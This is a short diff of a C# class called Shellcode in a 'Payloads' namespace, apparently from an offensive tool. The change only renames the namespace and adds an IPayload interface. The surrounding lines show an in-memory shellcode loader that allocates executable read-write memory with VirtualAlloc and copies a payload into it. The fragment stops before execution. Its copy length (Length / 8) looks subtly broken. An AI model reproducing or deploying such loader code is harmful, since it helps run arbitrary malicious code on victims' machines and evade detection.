@@ -1,11 +1,11 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 
-namespace csharp.Payloads
+namespace Reader.Payloads
 {
-    class Shellcode
+    class Shellcode : IPayload
     {
-        public void run(byte[] payload_data)
+        void IPayload.Run(byte[] payload_data)
         {
             IntPtr ptr = VirtualAlloc((IntPtr)0, payload_data.Length, 0x3000, 0x40);
             Marshal.Copy(payload_data, 0, (IntPtr)ptr, payload_data.Length / 8);
